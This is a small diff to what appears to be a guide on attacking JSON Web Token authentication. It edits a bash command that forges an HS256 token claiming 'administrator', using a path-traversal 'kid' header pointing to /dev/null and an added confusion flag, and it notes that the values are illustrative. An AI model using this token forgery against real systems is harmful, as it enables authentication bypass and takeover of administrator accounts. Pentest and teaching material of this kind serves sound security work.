@@ -146,7 +146,7 @@ Send the resulting token in the `Authorization: Bearer <token>` header or sessio
 ```bash
 python3 jwt_sign.py --key empty_secret.txt --alg HS256 \
   --payload '{"sub":"administrator"}' \
-  --header 'kid=../../../../dev/null'
+  --header 'kid=../../../../dev/null' --confusion
 ```
 This is inherently target-specific — the `kid` payload depends entirely on how the backend resolves it (file path, DB query, KMS key ID, etc.), so treat the values above as illustrative rather than universal.
 
